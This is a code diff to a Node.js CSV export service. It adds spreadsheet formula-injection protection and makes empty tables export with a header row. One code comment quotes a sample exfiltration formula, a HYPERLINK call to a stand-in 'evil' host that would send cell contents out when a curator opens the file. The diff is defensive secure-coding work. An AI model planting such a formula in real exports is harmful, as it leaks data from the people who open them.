@@ -4,6 +4,7 @@
  */
 
 const Papa = require('papaparse');
+const { neutralizeFormula } = require('../../utils/csv');
 const ExcelJS = require('exceljs');
 const { sequelize, KRTData, File, ChangeLog, ValidationResult, Submission } = require('../../models');
 const parserService = require('./parser.service');
@@ -187,10 +188,23 @@ async function generateDownload(submissionId, format = 'csv', round) {
  * Generate CSV file
  */
 function generateCSV(data, submissionId) {
-  const csv = Papa.unparse(data, {
-    columns: KRT_COLUMNS,
-    header: true
-  });
+  // Neutralize spreadsheet formula triggers before unparsing. Papa quotes to
+  // RFC-4180 but does not do this, and of everything the app exports, a KRT
+  // carries the LEAST trusted content: author-uploaded cells plus LM output. A
+  // stored `=HYPERLINK("http://evil/?x="&A1,"x")` would run when a curator
+  // opened the download. Every admin list export already used this guard; this
+  // one had been missed.
+  const guarded = data.map((row) => Object.fromEntries(
+    Object.entries(row).map(([k, v]) => [k, neutralizeFormula(v)])
+  ));
+  // `Papa.unparse([])` returns an EMPTY STRING — not a header row — so a KRT
+  // with no rows downloaded as a zero-byte file. That is not a KRT: the header
+  // is what makes an empty table re-uploadable (column validation runs on the
+  // headers, and the app's own tooling treats a header-only CSV as the valid
+  // empty KRT). The `fields` form emits the header with no data rows.
+  const csv = guarded.length
+    ? Papa.unparse(guarded, { columns: KRT_COLUMNS, header: true })
+    : Papa.unparse({ fields: KRT_COLUMNS, data: [] });
 
   return {
     buffer: Buffer.from(csv, 'utf-8'),
